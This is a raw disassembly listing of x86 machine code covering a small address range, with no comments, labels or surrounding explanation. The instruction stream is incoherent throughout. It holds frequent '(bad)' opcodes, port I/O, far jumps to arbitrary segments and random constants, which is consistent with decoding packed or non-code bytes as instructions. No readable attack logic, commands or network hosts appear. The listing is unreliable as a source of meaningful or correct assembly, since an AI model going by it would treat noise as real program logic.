  4190c3:	mov    eax,ds:0xf879948d
  4190c8:	push   esi
  4190c9:	sub    bh,al
  4190cb:	dec    ebp
  4190cc:	push   ds
  4190cd:	or     al,0x82
  4190cf:	adc    BYTE PTR [ebx],0xbe
  4190d2:	scas   al,BYTE PTR es:[edi]
  4190d3:	adc    al,BYTE PTR [edi-0x3a]
  4190d6:	jle    0x419086
  4190d8:	(bad)  
  4190d9:	(bad)  
  4190da:	hlt    
  4190db:	ret    0x981
  4190de:	retf   0x4abd
  4190e1:	mov    ch,0x2b
  4190e3:	dec    ebp
  4190e4:	mov    DWORD PTR [ecx+0x75],ecx
  4190e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190e8:	jbe    0x4190fb
  4190ea:	mov    al,BYTE PTR [eax]
  4190ec:	sub    BYTE PTR [ebp+ecx*8+0x72],al
  4190f0:	(bad)  
  4190f1:	push   0x5c6c7853
  4190f6:	cmp    al,0x46
  4190f8:	cmp    eax,0x12c07579
  4190fd:	mov    ?,WORD PTR [ebx-0x1e5c4a82]
  419103:	push   eax
  419104:	aas    
  419105:	push   eax
  419106:	out    dx,eax
  419107:	mov    bl,0x82
  419109:	add    al,0x3f
  41910b:	sub    BYTE PTR [ebx+0x5c],bh
  41910e:	rcl    DWORD PTR [edi+0x4e03f02a],0x98
  419115:	(bad)  
  419116:	sbb    DWORD PTR [ebx],edx
  419118:	retf   0x7de0
  41911b:	call   0xb9cc:0x1133bba1
  419122:	xor    BYTE PTR [ebp+0x12f859b4],bl
  419128:	out    dx,eax
  419129:	arpl   si,dx
  41912b:	mov    al,0xb2
  41912d:	mov    dh,0x9b
  41912f:	out    0xad,al
  419131:	mov    dh,0x10
  419133:	push   ebp
  419134:	pop    esi
  419135:	fadd   st,st(5)
  419137:	fwait
  419138:	inc    edx
  419139:	lods   al,BYTE PTR ds:[esi]
  41913a:	out    dx,eax
  41913b:	sbb    DWORD PTR [ecx+esi*4+0x6bca4851],esp
  419142:	(bad)  
  419143:	sbb    al,0x8a
  419145:	in     al,dx
  419146:	in     al,0xc3
  419148:	int3   
  419149:	xchg   ebx,eax
  41914a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41914b:	test   esp,esi
  41914d:	and    bl,bh
  41914f:	push   esi
  419150:	cmp    BYTE PTR [esi],cl
  419152:	shl    BYTE PTR [ebp-0x3d],0xab
  419156:	add    DWORD PTR ds:0xc280eada,ecx
  41915c:	addr16 inc edi
  41915e:	mov    ds:0x4fffad63,eax
  419163:	xor    BYTE PTR [edx],dl
  419165:	push   0x8ee01569
  41916a:	je     0x4191a0
  41916c:	push   0x12
  41916e:	pop    esp
  41916f:	jp     0x4191b4
  419171:	or     WORD PTR [ebx-0x11db97ea],sp
  419178:	in     eax,dx
  419179:	in     al,dx
  41917a:	rcpps  xmm4,XMMWORD PTR fs:[edx-0x30]
  41917f:	out    dx,al
  419180:	int3   
  419181:	jl     0x419199
  419183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419184:	repnz push 0x731a740a
  41918a:	icebp  
  41918b:	sub    eax,0xb3d83e3d
  419190:	jmp    0x2d6a6770
  419195:	scas   al,BYTE PTR es:[edi]
  419196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419197:	std    
  419198:	(bad)  
  419199:	test   al,0x4e
  41919b:	jge    0x4191e5
  41919d:	push   edx
  41919e:	div    BYTE PTR [ebx+edi*1-0x6d453389]
  4191a5:	or     DWORD PTR [ebx],edi
  4191a7:	mov    edi,0x903521f7
  4191ac:	rcl    DWORD PTR [esi-0x66c71110],1
  4191b2:	push   0xf85d2d4f
  4191b7:	adc    al,0x5f
  4191b9:	dec    BYTE PTR [eax+0x3789580a]
  4191bf:	mov    cl,0xbb
  4191c1:	xchg   esp,eax
  4191c2:	push   es
  4191c3:	cdq    
  4191c4:	push   ecx
  4191c5:	ret    0x59ab
  4191c8:	sub    DWORD PTR [ebp-0x80],ebp
  4191cb:	xor    DWORD PTR ds:0x1e0c8d34,0xfb0d1aae
  4191d5:	mov    al,0xe6
  4191d7:	xchg   esi,eax
  4191d8:	push   ss
  4191d9:	sub    ebx,DWORD PTR [ebx-0x124b1be4]
  4191df:	stos   BYTE PTR es:[edi],al
  4191e0:	add    DWORD PTR [ecx-0x2de1f09d],eax
  4191e6:	push   0x850abd07
  4191eb:	push   edx
  4191ec:	cli    
  4191ed:	call   0x3525:0x3e716721
  4191f4:	cmp    DWORD PTR [ecx],esp
  4191f6:	dec    esp
  4191f7:	push   esi
  4191f8:	hlt    
  4191f9:	lea    ebx,[edi]
  4191fb:	(bad)  
  4191fc:	aam    0x8f
  4191fe:	sbb    BYTE PTR [edx],dh
  419200:	push   ebx
  419201:	cld    
  419202:	pusha  
  419203:	retf   
  419204:	popf   
  419205:	imul   edx,esi,0xffffffac
  419208:	imul   ebx,DWORD PTR ds:0x2ae0d50d,0x34
  41920f:	pusha  
  419210:	jge    0x4191b0
  419212:	pop    esi
  419213:	scas   eax,DWORD PTR es:[edi]
  419214:	jbe    0x4191d4
  419216:	addr16 push 0x25
  419219:	aad    0x67
  41921b:	stc    
  41921c:	call   0x70bf0edc
  419221:	push   ecx
  419222:	retf   0x3356
  419225:	jb     0x419299
  419227:	out    0x81,al
  419229:	out    dx,al
  41922a:	ja     0x4191d2
  41922c:	lea    edi,[edi-0x12]
  41922f:	sbb    eax,0x131e0894
  419234:	test   al,0x4f
  419236:	mov    ch,0xa0
  419238:	inc    edi
  419239:	mov    ch,0x20
  41923b:	xchg   DWORD PTR [esi],edi
  41923d:	adc    ecx,DWORD PTR [eax+0x32308b8d]
  419243:	push   0x8c69c18c
  419248:	or     esp,DWORD PTR [edx]
  41924a:	cmc    
  41924b:	sub    DWORD PTR [esi],eax
  41924d:	dec    eax
  41924e:	fbstp  TBYTE PTR ds:0x96577b63
  419254:	cmp    eax,0x61b613eb
  419259:	(bad)  
  41925a:	jp     0x4192a2
  41925c:	scas   al,BYTE PTR es:[edi]
  41925d:	fucomip st,st(7)
  41925f:	fwait
  419260:	sub    BYTE PTR [ecx],bl
  419262:	ret    
  419263:	addr16 ds inc edx
  419266:	push   cs
  419267:	xchg   ecx,esp
  419269:	xchg   BYTE PTR [edx],dh
  41926b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41926c:	pop    es
  41926d:	call   0xad50d404
  419272:	cmp    bh,BYTE PTR [edi+ecx*2-0x1e]
  419276:	and    BYTE PTR [eax+0x73],bh
  419279:	adc    DWORD PTR ds:0x3733dc3d,ecx
  41927f:	mov    ebx,0x62b94e33
  419284:	or     al,BYTE PTR [edx-0x5970f459]
  41928a:	pusha  
  41928b:	arpl   bx,bp
  41928d:	rol    BYTE PTR [ebx],cl
  41928f:	inc    esi
  419290:	dec    eax
  419291:	push   ds
  419292:	sub    al,0xaf
  419294:	jge    0x419271
  419296:	dec    ebx
  419297:	and    BYTE PTR [ebp-0x3696c0b5],ah
  41929d:	jae    0x41931e
  41929f:	ins    BYTE PTR es:[edi],dx
  4192a0:	jmp    0xf802:0x8c8a03a6
  4192a7:	pop    ds
  4192a8:	adc    al,cl
  4192aa:	jmp    0x419257
  4192ac:	scas   eax,DWORD PTR es:[edi]
  4192ad:	add    BYTE PTR [ebp-0x6f],0xed
  4192b1:	push   ss
  4192b2:	not    DWORD PTR [ebx-0x78]
  4192b5:	test   DWORD PTR [ebp-0x62],eax
  4192b8:	mov    esi,0xeabb9033
  4192bd:	jmp    0x3a34:0xd29be0d8
  4192c4:	addr16 xchg esi,eax
  4192c6:	mov    dh,0x1e
  4192c8:	sub    edi,esi
  4192ca:	out    dx,eax
  4192cb:	fs jbe 0x419321
  4192ce:	push   ebp
  4192cf:	ret    0x7c13
  4192d2:	call   0xac96ef8b
  4192d7:	and    eax,0xa95e1857
  4192dc:	dec    esp
  4192dd:	adc    edi,DWORD PTR [ebp+0x1e679994]
  4192e3:	xor    al,al
  4192e5:	add    al,0xb5
  4192e7:	pop    edx
  4192e8:	daa    
  4192e9:	imul   ebx,DWORD PTR [esi-0x11e3ad11],0x83bc6b90
  4192f3:	jno    0x4192f5
  4192f5:	jmp    0x31672273
  4192fa:	lss    eax,FWORD PTR [edx]
  4192fd:	cs sbb bl,al
  419300:	jbe    0x419312
  419302:	adc    al,0xeb
  419304:	popa   
  419305:	ds pop ebp
  419307:	test   esp,0x5a0ec753
  41930d:	xchg   ebx,eax
  41930e:	inc    ebp
  41930f:	fst    QWORD PTR [ebx+0x51]
  419312:	xchg   ebp,eax
  419313:	jecxz  0x41931d
  419315:	(bad)  
  419316:	fisttp QWORD PTR [ebp-0x2f385dd7]
  41931c:	pop    eax
  41931d:	inc    edi
  41931e:	mov    gs,ebp
  419320:	cdq    
  419321:	sub    esi,DWORD PTR [eax]
  419323:	sbb    al,0xde
  419325:	fabs   
  419327:	sub    dh,dh
  419329:	js     0x4192d5
  41932b:	sbb    BYTE PTR [esi],0xfe
  41932e:	pop    es
  41932f:	xchg   ebp,eax
  419330:	xor    eax,0x563d9fe6
  419335:	pop    ebp
  419336:	fld    st(2)
  419338:	out    dx,al
  419339:	ds inc eax
  41933b:	icebp  
  41933c:	inc    esp
  41933d:	mov    dh,0xb2
  41933f:	pop    ebx
  419340:	rol    BYTE PTR [esi+ebp*1],1
  419343:	pop    ss
  419344:	(bad)  
  419345:	idiv   al
  419347:	mov    ch,0xd1
  419349:	loop   0x4192d2
  41934b:	les    ebx,FWORD PTR [ebp+0x2234c8dc]
  419351:	push   ebp
  419352:	cmc    
  419353:	or     BYTE PTR [ecx-0x7857526d],0xbf
  41935a:	jno    0x4193a9
  41935c:	fyl2x  
  41935e:	push   edx
  41935f:	mov    eax,ds:0x74eed33a
  419364:	xchg   BYTE PTR [esi+edx*2+0x71],dl
  419368:	ret    
  419369:	out    0xc,eax
  41936b:	ror    BYTE PTR [edi+esi*4-0x6d32cf3f],cl
  419372:	inc    ebx
  419373:	mov    ebp,0x8e9b9f38
  419378:	adc    dh,BYTE PTR [ecx-0x38]
  41937b:	add    al,0x14
  41937d:	dec    ebx
  41937e:	mov    cl,0x51
  419380:	neg    BYTE PTR [edi-0x7e]
  419383:	sbb    eax,0xda013677
  419388:	sbb    DWORD PTR [esi-0x172cddac],eax
  41938e:	add    BYTE PTR [ebx+0x1c27f742],bl
  419394:	fdivr  DWORD PTR [eax-0x1212666f]
  41939a:	and    DWORD PTR [ebx],esi
  41939c:	sbb    esi,DWORD PTR [edx+eax*2]
  41939f:	hlt    
  4193a0:	or     esp,DWORD PTR [ebp-0x73]
  4193a3:	push   esi
  4193a4:	out    0x67,al
  4193a6:	(bad)  
  4193a7:	cmp    BYTE PTR [ecx-0x53ece6b9],dh
  4193ad:	pop    edi
  4193ae:	add    DWORD PTR [esi-0x5e],esp
  4193b1:	xor    esp,DWORD PTR [edi]
  4193b3:	add    BYTE PTR [ecx],0x37
  4193b6:	xchg   ebp,eax
  4193b7:	int3   
  4193b8:	sbb    BYTE PTR [esi],bl
  4193ba:	adc    DWORD PTR [eax+0x76],esp
  4193bd:	mov    ds:0xc5c93d3f,eax
  4193c2:	test   ch,al
  4193c4:	add    BYTE PTR [ebp+eiz*1-0xb2e8e21],cl
  4193cb:	mov    ch,0x77
  4193cd:	out    dx,eax
  4193ce:	scas   eax,DWORD PTR es:[edi]
  4193cf:	sbb    al,0x53
  4193d1:	mov    dh,0x1f
  4193d3:	call   0x42d55293
  4193d8:	add    edx,ebx
  4193da:	repz cmp ch,BYTE PTR [ebp-0x66]
  4193de:	xchg   edx,eax
  4193df:	(bad)  
  4193e1:	inc    eax
  4193e2:	sub    al,0xff
  4193e4:	add    eax,0x971fcf75
  4193e9:	shl    BYTE PTR [eax+eax*8+0x5],cl
  4193ed:	jle    0x419454
  4193ef:	add    DWORD PTR [edx+0x2ed8e128],ebx
  4193f5:	lock cdq 
  4193f7:	(bad)  
  4193f8:	cmp    bl,al
  4193fa:	adc    ch,dh
  4193fc:	mov    edi,0xba01c90a
  419401:	jmp    0xaf89:0xe6505ed1
  419408:	jb     0x4193cb
  41940a:	jo     0x419462
  41940c:	or     dl,BYTE PTR [esi+0x1fa60736]
  419412:	cmovs  ecx,DWORD PTR [ebp-0x371a7417]
  419419:	bound  edx,QWORD PTR [ebp+0x17399948]
  41941f:	test   al,0xf7
  419421:	and    eax,0x52efe08d
  419426:	(bad)  
  419427:	fadd   QWORD PTR [ecx-0x641eff74]
  41942d:	mov    edx,0x5254294c
  419432:	in     eax,dx
  419433:	jb     0x4194a6
  419435:	mov    bl,0x20
  419437:	or     edx,esp
  419439:	jo     0x4194ab
  41943b:	jnp    0x41941f
  41943d:	push   eax
  41943e:	(bad)  
  41943f:	fs mov dl,0x6b
  419442:	into   
  419443:	iret   
  419444:	ds and al,0xf8
  419447:	lods   al,BYTE PTR ds:[esi]
  419448:	jae    0x4193f4
  41944a:	mov    ch,0xd
  41944c:	jne    0x419499
  41944e:	or     BYTE PTR [eax+0x2108fb8f],ch
  419454:	and    BYTE PTR [edi+esi*4+0x6cb226e8],dl
  41945b:	ret    0x5adf
  41945e:	sbb    DWORD PTR [ebx],ebx
  419460:	push   ebx
  419461:	xor    dl,BYTE PTR [ecx]
  419463:	xor    al,0xb6
  419465:	pop    ebp
  419466:	dec    ebp
  419467:	and    dh,BYTE PTR [esi]
  419469:	jb     0x4193fc
  41946b:	jbe    0x419498
  41946d:	dec    ecx
  41946e:	mov    cl,0x13
  419470:	div    BYTE PTR [edx-0x72d078f0]
  419476:	cmpxchg bh,dh
  419479:	loopne 0x419486
  41947b:	aaa    
  41947c:	pop    ebx
  41947d:	scas   eax,DWORD PTR es:[edi]
  41947e:	call   0x9d7267db
  419483:	pop    ds
  419484:	xchg   edx,eax
  419485:	and    al,0xb1
  419487:	pop    esi
  419488:	push   cs
  419489:	shl    esi,1
  41948b:	arpl   ax,bp
  41948d:	jg     0x41942f
  41948f:	xor    DWORD PTR ds:0xeb356a74,0xffffffd1
  419496:	call   0xbecd8bd1
  41949b:	mov    ?,WORD PTR [ebx-0x24]
  41949e:	pop    ecx
  41949f:	xchg   esp,eax
  4194a0:	jns    0x4194dd
  4194a2:	xchg   edi,eax
  4194a3:	jle    0x419448
  4194a5:	sbb    eax,0xf25e09f9
  4194aa:	pushf  
  4194ab:	mov    ds:0x1522dce,al
  4194b0:	add    ah,BYTE PTR [edx-0x29]
  4194b3:	and    DWORD PTR ds:0x67a2c5c5,0xd43e9ca6
  4194bd:	sbb    al,0xc7
  4194bf:	retf   0xeb85
  4194c2:	mov    ds:0x3dc9ab7e,eax
  4194c7:	push   eax
  4194c8:	rol    DWORD PTR [eax+0x48],cl
  4194cb:	mov    ss,WORD PTR [ebx+0x54]
  4194ce:	mov    ecx,0x9ce9e2a
  4194d3:	stos   BYTE PTR es:[edi],al
  4194d4:	xor    BYTE PTR [ecx+0x2],dh
  4194d7:	test   DWORD PTR [edx-0x23],0x299bb9ee
  4194de:	push   dx
  4194e0:	retf   
  4194e1:	adc    al,0x12
  4194e3:	mov    ah,0xd3
  4194e5:	shl    BYTE PTR [edi+0x7c],cl
  4194e8:	jp     0x419505
  4194ea:	or     DWORD PTR [edx],esi
  4194ec:	sbb    BYTE PTR fs:[ebp-0x1b9c7aa5],dl
  4194f3:	mov    eax,0xd4cee466
  4194f8:	xor    BYTE PTR [esi-0x38],ch
  4194fb:	xor    al,0xc6
  4194fd:	dec    esi
  4194fe:	push   esi
  4194ff:	loopne 0x41952c
  419501:	je     0x4194ca
  419503:	push   es
  419504:	shl    eax,1
  419506:	in     eax,dx
  419507:	bound  ebx,QWORD PTR [edi+0x407fb947]
  41950d:	xor    bh,BYTE PTR [eax+0x33]
  419510:	cmp    eax,edx
  419512:	loop   0x4194b1
  419514:	mov    WORD PTR [esi+0x1d],ss
  419517:	in     al,dx
  419518:	into   
  419519:	pusha  
  41951a:	hlt    
  41951b:	sti    
  41951c:	adc    ch,BYTE PTR [eax]
  41951e:	seto   BYTE PTR [edx+0x3a]
  419522:	shl    BYTE PTR [ebp+0x5d],1
  419525:	xor    al,0x8c
  419527:	(bad)  
  419528:	and    al,0xae
  41952a:	jg     0x419573
  41952c:	add    DWORD PTR [eax],ecx
  41952e:	or     eax,0xece49dac
  419533:	fimul  DWORD PTR [edx]
  419535:	cmp    BYTE PTR [edi],ch
  419537:	pop    esp
  419538:	adc    DWORD PTR [ecx-0x19],ebx
  41953b:	out    0x83,al
  41953d:	mov    dh,dl
  41953f:	push   ecx
  419540:	push   edi
  419541:	pushf  
  419542:	jle    0x41953f
  419544:	sub    al,0x21
  419546:	ret    
  419547:	mov    ds:0xb11cf27d,al
  41954c:	daa    
  41954d:	pop    ebx
  41954e:	jno    0x419507
  419550:	sub    al,0x7d
  419552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419553:	add    DWORD PTR [ebx-0x3d],ebp
  419556:	test   DWORD PTR [edi],ecx
  419558:	scas   eax,DWORD PTR es:[edi]
  419559:	dec    esp
  41955a:	nop
  41955b:	aad    0x8f
  41955d:	dec    esp
  41955e:	(bad)  
  41955f:	out    dx,al
  419560:	sbb    eax,0x7fa6dfa1
  419565:	mov    dh,0x88
  419567:	sahf   
  419568:	fcomp  DWORD PTR [ecx+0x3e53721b]
  41956e:	mov    ebx,0x6fd10ab8
  419573:	push   es
  419574:	(bad)  
  419575:	ds clc 
  419577:	push   ebx
  419578:	test   BYTE PTR [ecx-0x742a9ccd],bh
  41957e:	push   cs
  41957f:	add    DWORD PTR [ebx+0x4f],ecx
  419582:	daa    
  419583:	jne    0x419513
  419585:	iret   
  419586:	fmul   st(1),st
  419588:	aad    0xb3
  41958a:	lahf   
  41958b:	mov    dh,0x48
  41958d:	pushf  
  41958e:	mov    edx,0x7cf6a536
  419593:	fstp   st(5)
  419595:	aam    0x40
  419597:	nop
  419598:	adc    DWORD PTR [eax+eax*2-0x4a7a8ed3],0x89544828
  4195a3:	sub    dh,al
  4195a5:	mov    esi,0xaca7a62
  4195aa:	mov    DWORD PTR [edx+0x7f2cca45],edi
  4195b0:	arpl   WORD PTR [esi],cx
  4195b2:	shr    BYTE PTR [eax+0x1a],1
  4195b5:	rol    DWORD PTR fs:[edx],1
  4195b8:	shr    DWORD PTR [esi],1
  4195ba:	pop    ebx
  4195bb:	mov    DWORD PTR ds:[edx-0x32e87590],edx
  4195c2:	pop    ebx
  4195c3:	mov    ebp,0xe5e0b3e1
  4195c8:	fcmove st,st(6)
  4195ca:	pop    edx
  4195cb:	and    eax,0x8d3e0fcf
  4195d0:	cli    
  4195d1:	sbb    ebp,DWORD PTR [eax]
  4195d3:	in     al,dx
  4195d4:	int    0xf8
  4195d6:	mov    ecx,0x2e48d9ab
  4195db:	add    bh,ah
  4195dd:	add    ch,BYTE PTR [ebx]
  4195df:	in     eax,dx
  4195e0:	mov    DWORD PTR [edi],esp
  4195e2:	or     DWORD PTR [edi],edi
  4195e4:	ret    0x9a9
  4195e7:	aaa    
  4195e8:	sub    esp,esi
  4195ea:	xor    ecx,esi
  4195ec:	pop    es
  4195ed:	cdq    
  4195ee:	cdq    
  4195ef:	cmp    eax,0x1a117a8d
  4195f4:	sbb    eax,0x65acf888
  4195f9:	xchg   edx,eax
  4195fa:	inc    esi
  4195fb:	les    edx,FWORD PTR [ebx-0xc2b4f99]
  419601:	sub    DWORD PTR [ebx+0x2e6b4a3f],ecx
  419607:	pop    ds
  419608:	jbe    0x419629
  41960a:	(bad)  
  41960b:	sar    DWORD PTR [eax+edi*4-0x66a23e9],cl
  419612:	push   0xffffff8b
  419614:	and    BYTE PTR [esi+0x508b6037],ch
  41961a:	mov    DWORD PTR [edx],edx
  41961c:	sub    al,0x8
  41961e:	jl     0x419652
  419620:	test   al,0x51
  419622:	xchg   BYTE PTR [ebp+ebp*2+0x39],dl
  419626:	mov    dl,0xd
  419628:	hlt    
  419629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41962a:	data16 out 0x34,al
  41962d:	sbb    al,0xaf
  41962f:	std    
  419630:	mov    cl,0xc9
  419632:	std    
  419633:	jg     0x419653
  419635:	xchg   esi,eax
  419636:	push   es
  419637:	outs   dx,BYTE PTR ds:[esi]
  419638:	out    dx,eax
  419639:	(bad)  
  41963a:	pop    eax
  41963b:	push   ebp
  41963c:	shl    BYTE PTR gs:[esi],cl
  41963f:	sbb    BYTE PTR [edi-0x7709b4c2],0x62
  419646:	arpl   WORD PTR [ebx-0x17],bp
  419649:	jbe    0x419609
  41964b:	and    edx,ecx
  41964d:	add    eax,0xe3ca2c78
  419652:	jbe    0x4196b7
  419654:	adc    ebp,DWORD PTR [ebp+0x3f]
  419657:	pop    ebp
  419658:	scas   eax,DWORD PTR es:[edi]
  419659:	add    ebp,DWORD PTR [eax]
  41965b:	hlt    
  41965c:	inc    ecx
  41965d:	and    DWORD PTR [ecx-0x777caf64],ebx
  419663:	sub    edx,edi
  419665:	imul   esi,DWORD PTR [eax],0x5
  419668:	add    dl,BYTE PTR [edx-0x70]
  41966b:	push   esi
  41966c:	inc    edi
  41966d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41966e:	fld    DWORD PTR [ebp+0x1dc080ce]
  419674:	lock sbb bh,BYTE PTR [edi-0x690079cb]
  41967b:	dec    eax
  41967c:	inc    esi
  41967d:	jb     0x4196a2
  41967f:	aam    0xe1
  419681:	dec    esp
  419682:	push   esi
  419683:	ret    0x35f7
  419686:	cmp    bh,dh
  419688:	outs   dx,BYTE PTR ds:[esi]
  419689:	jb     0x419630
  41968b:	mov    eax,0xe4a2297c
  419690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419691:	aad    0x1b
  419693:	sub    DWORD PTR [eax-0x1bec2e6e],edx
  419699:	je     0x4196f6
  41969b:	test   al,0x83
  41969d:	inc    edx
  41969e:	sar    DWORD PTR [ebx],1
  4196a0:	daa    
  4196a1:	xchg   esi,eax
  4196a2:	(bad)  
  4196a3:	adc    al,0x9
  4196a5:	hlt    
  4196a6:	(bad)  
  4196a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a8:	test   ax,0x42b
  4196ac:	scas   al,BYTE PTR es:[edi]
  4196ad:	sbb    DWORD PTR [edx+0x44018fe9],edi
  4196b3:	aaa    
  4196b4:	pusha  
  4196b5:	mov    bh,0x9d
  4196b7:	jnp    0x41971f
  4196b9:	loop   0x4196c7
  4196bb:	adc    al,0xd6
  4196bd:	push   ss
  4196be:	clc    
  4196bf:	cs dec esp
  4196c1:	xor    ebp,0xc
  4196c4:	(bad)  
  4196c5:	retf   
  4196c6:	aad    0xaa
  4196c8:	add    eax,0x6f4784a0
  4196cd:	imul   ecx,DWORD PTR [ebp-0xb],0xffffffe9
  4196d1:	xchg   ebp,eax
  4196d2:	mov    ds:0xf92f74ba,al
  4196d7:	and    edi,DWORD PTR [edi+0x54]
  4196da:	das    
  4196db:	(bad)  
  4196dc:	loop   0x41973a
  4196de:	imul   ebp,DWORD PTR [edi-0x740fcc01],0xffffffcd
  4196e5:	and    eax,0xc1b89e27
  4196ea:	std    
  4196eb:	sbb    al,0x25
  4196ed:	or     edx,DWORD PTR [edx]
  4196ef:	and    ebx,DWORD PTR [edi+0x16]
  4196f2:	dec    ecx
  4196f3:	add    edi,DWORD PTR [ebp-0x60]
  4196f6:	pop    edi
  4196f7:	fadd   DWORD PTR [ebp+0x6]
  4196fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196fb:	xchg   ebp,eax
  4196fc:	cdq    
  4196fd:	aas    
  4196fe:	fadd   QWORD PTR [eax+0x56]
  419702:	fmul   DWORD PTR ss:[edx+0x4fe14a6f]
  419709:	adc    al,dl
  41970b:	loopne 0x419785
  41970d:	mov    ebx,0x65fdc72d
  419712:	dec    eax
  419713:	xor    ah,BYTE PTR [ebp+0x5d3cb18e]
  419719:	sbb    al,0x49
  41971b:	retf   0x516a
  41971e:	dec    esp
  41971f:	popa   
  419720:	lods   eax,DWORD PTR ds:[esi]
  419721:	cmp    ch,bh
  419723:	neg    DWORD PTR [ebx-0x2d31c8bb]
  419729:	mov    bl,0xa1
  41972b:	adc    DWORD PTR [ebp+0x10849b98],0xacc4488
  419735:	mov    al,0x14
  419737:	cli    
  419738:	push   0xb1b3550e
  41973d:	dec    ebx
  41973e:	xor    ebx,esp
  419740:	pop    ebx
  419741:	push   cs
  419742:	sbb    al,0x39
  419744:	jbe    0x419794
  419746:	push   ebp
  419747:	cmc    
  419748:	fs idiv edx
  41974b:	mov    ebx,0xa3d73f7f
  419750:	push   ecx
  419751:	nop
  419752:	dec    ecx
  419753:	pop    eax
  419754:	push   ebx
  419755:	clc    
  419756:	sbb    ebx,DWORD PTR [ebx-0x5761b414]
  41975c:	xor    BYTE PTR [eax+edi*4+0x7b],cl
  419760:	out    0x9b,eax
  419762:	pop    es
  419763:	cmp    eax,0x750c376b
  419768:	popf   
  419769:	jnp    0x41972f
  41976b:	scas   eax,DWORD PTR es:[edi]
  41976c:	xor    BYTE PTR [ebx-0x4c3352d4],dl
  419772:	or     esp,DWORD PTR [edi+ebp*4-0x55acb898]
  419779:	cmp    eax,0x5dfb8cbf
  41977e:	or     eax,0xfdf9ae11
  419783:	mov    dh,0x57
  419785:	inc    eax
  419786:	mov    bl,0x6b
  419788:	xchg   edx,eax
  419789:	sub    DWORD PTR [edx],ecx
  41978b:	das    
  41978c:	imul   eax
  41978e:	ret    0xf67c
  419791:	pop    esi
  419792:	jnp    0x419780
  419794:	push   eax
  419795:	cli    
  419796:	es add al,0x1c
  419799:	loop   0x4197ae
  41979b:	dec    DWORD PTR [ebp+esi*1-0x7f]
  41979f:	xchg   DWORD PTR [esi],edi
  4197a1:	cwde   
  4197a2:	dec    eax
  4197a3:	adc    DWORD PTR [eax+0x7a],esi
  4197a6:	push   0xffffffa4
  4197a8:	shl    ah,cl
  4197aa:	sbb    al,0xac
  4197ac:	in     al,dx
  4197ad:	(bad)  
  4197ae:	mov    bh,0xa3
  4197b0:	xlat   BYTE PTR ds:[ebx]
  4197b1:	sub    al,ch
  4197b3:	inc    esi
  4197b4:	mov    ds:0xdd36e322,al
  4197b9:	jo     0x41974f
  4197bb:	adc    DWORD PTR [edx-0x77],0x1e
  4197bf:	lock jno 0x4197fc
  4197c2:	mov    ch,0xae
  4197c4:	mov    ds:0xce492f1f,al
  4197c9:	and    DWORD PTR [esi],ebp
  4197cb:	int3   
  4197cc:	cli    
  4197cd:	test   edi,ebx
  4197cf:	xchg   BYTE PTR [eax+0x2f],al
  4197d2:	pop    ebx
  4197d3:	je     0x41982b
  4197d5:	push   esi
  4197d6:	xlat   BYTE PTR ds:[ebx]
  4197d7:	inc    ecx
  4197d8:	or     DWORD PTR [ebx],0x46907beb
  4197de:	cmp    eax,0xc1cdec57
  4197e3:	(bad)  
  4197e4:	rcr    BYTE PTR [eax],cl
  4197e6:	in     al,dx
  4197e7:	jle    0x4197f1
  4197e9:	push   es
  4197ea:	repnz lahf 
  4197ec:	jmp    0x4197f8
  4197ee:	add    cl,dh
  4197f0:	adc    edi,DWORD PTR [ebp+0x17]
  4197f3:	mov    ebx,0x1d174c7c
  4197f8:	adc    dl,bl
  4197fa:	std    
  4197fb:	push   eax
  4197fc:	int    0x9b
  4197fe:	dec    ebp
  4197ff:	pop    edx
  419800:	pop    esp
  419801:	pop    ss
  419802:	add    DWORD PTR [edi+esi*2-0x71837510],ecx
  419809:	add    al,BYTE PTR [edi+0x5]
  41980c:	mov    eax,0xb0c0dfee
  419811:	(bad)  
  419812:	push   0x77f1a56d
  419817:	daa    
  419818:	(bad)  
  419819:	or     edx,esp
  41981b:	outs   dx,BYTE PTR ss:[esi]
  41981d:	js     0x4197cc
  41981f:	jne    0x41987d
  419821:	sbb    BYTE PTR [edx+0x66231150],al
  419827:	aad    0x78
  419829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41982a:	sub    eax,0x16edfb44
  41982f:	lea    esi,[edx+0x7a]
  419832:	cli    
  419833:	xor    ch,BYTE PTR [ecx-0x79]
  419836:	push   edi
  419837:	cmp    bl,BYTE PTR [ebp+0x15]
  41983a:	stos   DWORD PTR es:[edi],eax
  41983b:	cli    
  41983c:	and    cl,bh
  41983e:	loope  0x4197d5
  419840:	jge    0x419880
  419842:	fdivrp st(3),st
  419844:	(bad)  
  419845:	mov    esp,0x929204c9
  41984a:	push   cs
  41984b:	push   0x55c06ec5
  419850:	or     al,0x89
  419852:	cwde   
  419853:	leave  
  419854:	and    ebp,DWORD PTR [eax-0x2c9d9afa]
  41985a:	fcmovnb st,st(1)
  41985c:	int3   
  41985d:	rcr    BYTE PTR [ebx],0xbf
  419860:	or     esi,edi
  419862:	push   0xffffffac
  419864:	push   0x1a8cc46c
  419869:	mov    ebp,0xe93eb357
  41986e:	mov    al,es:0x78ace471
  419874:	(bad)  
  419875:	xor    BYTE PTR [ebx-0x133ac091],dl
  41987b:	push   eax
  41987c:	ficom  DWORD PTR [edx+edx*4+0xdfb567d]
  419883:	xor    eax,ebx
  419885:	pop    esp
  419886:	cmp    bh,BYTE PTR [ecx+0x3f43f3b1]
  41988c:	div    DWORD PTR [eax+0x48]
  41988f:	jb     0x419892
  419891:	xchg   edi,eax
  419892:	push   es
  419893:	adc    BYTE PTR [ecx],cl
  419895:	dec    eax
  419896:	jne    0x4198f5
  419898:	jmp    0x5998:0xd8769833
  41989f:	test   DWORD PTR [edi+0x18a61516],eax
  4198a5:	add    ecx,DWORD PTR [esi]
  4198a7:	retf   
  4198a8:	add    DWORD PTR [esi+0x23edf5ca],ecx
  4198ae:	hlt    
  4198af:	cmp    edi,DWORD PTR [ebx]
  4198b1:	jl     0x41989e
  4198b3:	popf   
